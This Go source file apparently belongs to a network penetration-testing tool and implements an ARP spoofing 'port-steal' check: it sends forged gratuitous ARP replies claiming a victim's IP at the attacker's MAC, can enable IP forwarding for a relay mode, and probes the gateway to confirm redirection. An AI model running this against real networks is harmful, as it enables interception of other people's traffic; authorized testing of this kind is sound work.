// portsteal.go implements the port-steal ARP spoofing check. The base
// entry is impact temporary, restore decay with no stated bound, affects
// clients: the gratuitous ARP replies, sent from the attack leg's MAC,
// claim the victim's address at that MAC in the caches of the hosts that
// take them, and those entries age out on the hosts' own timers, while
// the switch relearns the victim's port on the victim's next frame. The
// relay mode is impact temporary, restore active, affects clients: it sets
// net.ipv4.ip_forward to 1 through the sysctl seam before its first frame
// and its armed step writes back the value it read.

package l2

import (
	"context"
	"encoding/json"
	"fmt"
	"net"

	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"

	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
	"go.aledante.io/FlowSeer/src/edge/netpen/check"
)

// ipForwardKey is the kernel setting the relay mode changes.
const ipForwardKey = "net.ipv4.ip_forward"

type portStealFinding struct {
	Action  string `json:"action"`
	Target  string `json:"target"`
	Restore string `json:"restore"`
}

// RunPortSteal sends three gratuitous ARP replies claiming the target's
// victim IPv4 address at the attack leg's MAC, then probes the gateway's
// cache with an ICMP echo request sent to the gateway's MAC from the
// victim's IPv4. The predicate is the reply's Ethernet destination: the
// gateway's echo reply addressed to the attack leg's MAC confirms that the
// gateway sends the victim's traffic to the attacker, a reply to another
// MAC or an ARP request from the gateway for the victim's address resists,
// and silence within the window is pending. The relay mode reads
// net.ipv4.ip_forward, sets it to 1 before the first frame, and arms the
// ip-forward-restore step that writes the read value back.
func RunPortSteal(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	if err := deps.Target.Need(check.FieldVictim, check.FieldGateway, check.FieldGatewayMAC); err != nil {
		return check.Verdict{}, err
	}
	src := deps.AttackLeg.Addr().MAC
	target := deps.Target.Victim.IP

	frameCount := 3
	restoreArmed := "no"
	if deps.Entry.Restore.Kind == check.RestoreActive {
		before, err := deps.Sysctl.Get(ipForwardKey)
		if err != nil {
			return check.Verdict{}, errs.Wrap(err, "portsteal: read ip_forward")
		}
		deps.Teardown.Arm("ip-forward-restore", func(context.Context) error {
			return deps.Sysctl.Set(ipForwardKey, before)
		})
		if err := deps.Sysctl.Set(ipForwardKey, "1"); err != nil {
			return check.Verdict{}, errs.Wrap(err, "portsteal: enable ip_forward")
		}
		restoreArmed = "yes"
	}

	for i := 0; i < frameCount; i++ {
		pkt, err := craftPortStealARP(src, target)
		if err != nil {
			return check.Verdict{}, errs.Wrapf(err, "portsteal: craft frame %d", i)
		}
		if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
			return check.Verdict{}, errs.Wrapf(err, "portsteal: send frame %d", i)
		}
	}

	detail, _ := json.Marshal(portStealFinding{
		Action:  "port-steal",
		Target:  target.String(),
		Restore: restoreArmed,
	})
	deps.Emitter.Finding("arp", detail)

	v, err := observeCacheProbe(ctx, deps, deps.Target.Gateway, target, fmt.Sprintf("the gateway sent its traffic for %s to the attack leg", target))
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "portsteal")
	}
	return v, nil
}

// craftPortStealARP builds a gratuitous ARP reply: the attacker announces
// the target's IP with the attacker's MAC.
func craftPortStealARP(src net.HardwareAddr, target net.IP) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       broadcastMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := &layers.ARP{
		AddrType:          1, // Ethernet
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         2, // ARP reply
		SourceHwAddress:   src,
		SourceProtAddress: target.To4(),
		DstHwAddress:      broadcastMAC,
		DstProtAddress:    target.To4(),
	}
	return craft.Default(eth, arp)
}
